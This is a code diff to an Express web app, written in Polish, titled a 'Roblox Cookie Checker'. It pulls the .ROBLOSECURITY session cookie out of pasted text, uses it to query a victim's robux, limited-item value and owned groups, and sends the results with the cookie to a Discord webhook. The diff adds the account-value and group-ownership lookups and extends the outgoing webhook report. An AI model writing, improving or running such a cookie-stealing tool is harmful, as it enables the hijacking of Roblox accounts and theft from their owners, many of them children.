@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – HTML + JS
+// Strona główna – HTML + JS (bez zmian)
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -29,11 +29,11 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <div class="container">
-  <h1>Roblox Cookie Checker (PowerShell & inne formaty)</h1>
-  <p>Wklej kod PowerShell / konsolę / headers / JSON itp.<br>
-  Cookie zostanie automatycznie wyciągnięte z formatu: <code>".ROBLOSECURITY", "TU_COOKIE"</code></p>
+  <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
+  <p>Wklej dowolny tekst (PowerShell, konsola, headers, JSON itp.)<br>
+  Cookie zostanie wyciągnięte automatycznie</p>
 
-  <textarea id="input" placeholder="Wklej tutaj cały kod / tekst..."></textarea>
+  <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
 
   <button onclick="check()">Sprawdź i wyślij na webhook</button>
 
@@ -52,32 +52,32 @@ async function check() {
     return;
   }
 
-  // ──────────────────────────────────────────────
-  // ULEPSZONY WYCIĄGACZ – specjalnie pod Twój PowerShell
-  // ──────────────────────────────────────────────
+  // Wyciąganie cookie – ulepszone pod PowerShell i inne formaty
   let cookie = null;
+  let match;
 
-  // 1. Najważniejszy – format z New-Object System.Net.Cookie(".ROBLOSECURITY", "COOKIE", ...)
-  let match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
-  if (match && match[1]) {
-    cookie = match[1].trim();
+  // 1. Format PowerShell / .NET
+  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
+  if (match && match[1]) cookie = match[1].trim();
+
+  // 2. Klasyczny -and-items.|_
+  if (!cookie) {
+    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
+    if (match && match[1]) cookie = match[1].trim();
   }
 
-  // 2. Jeśli nie złapał – szuka po prostu długiego ciągu z ostrzeżeniem
+  // 3. Długi ciąg z ostrzeżeniem
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
 
-  // 3. Ostateczny fallback – najdłuższy ciąg zaczynający się od _
+  // 4. Ostateczny fallback – najdłuższy ciąg zaczynający się od _
   if (!cookie) {
-    const fallbackMatches = raw.match(/_\\|[^"]{200,}/g) || [];
-    if (fallbackMatches.length > 0) {
-      cookie = fallbackMatches.reduce((a, b) => a.length > b.length ? a : b).trim();
-    }
+    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
+    if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
   }
 
-  // Walidacja
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
     result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
     return;
@@ -130,7 +130,7 @@ async function check() {
   `);
 });
 
-// Endpoint /check + wysyłka na webhook
+// Endpoint /check – pełna logika + wysyłka embeda
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
@@ -190,6 +190,30 @@ app.post('/check', async (req, res) => {
       if (currencyRes.ok) {
         const data = await currencyRes.json();
         robux = data.robux || 0;
+      }
+    } catch {}
+
+    // RAP (Recent Average Price) – suma wartości limitedów
+    let rap = 0;
+    try {
+      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+      });
+      if (assetsRes.ok) {
+        const assets = await assetsRes.json();
+        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
+      }
+    } catch {}
+
+    // Groups Owned (ile grup jest ownerem – rank 255)
+    let groupsOwned = 0;
+    try {
+      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+      });
+      if (groupsRes.ok) {
+        const groups = await groupsRes.json();
+        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
       }
     } catch {}
 
@@ -278,6 +302,8 @@ app.post('/check', async (req, res) => {
       userId: userData.id,
       hasPremium,
       robux,
+      rap,                // ← dodane
+      groupsOwned,        // ← dodane
       accountAgeDays,
       created: createdDate || 'failed',
       avatarUrl,
@@ -289,7 +315,7 @@ app.post('/check', async (req, res) => {
       sabCount
     };
 
-    // Wysyłka na webhook (jeśli masz zmienną WEBHOOK w Railway)
+    // Wysyłka na webhook – pełny embed z Twoim stylem
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -305,6 +331,11 @@ app.post('/check', async (req, res) => {
                 url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
               },
               fields: [
+                {
+                  name: "┌─────── Account Stats ───────┐",
+                  value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
+                  inline: false
+                },
                 {
                   name: "**Info**",
                   value:
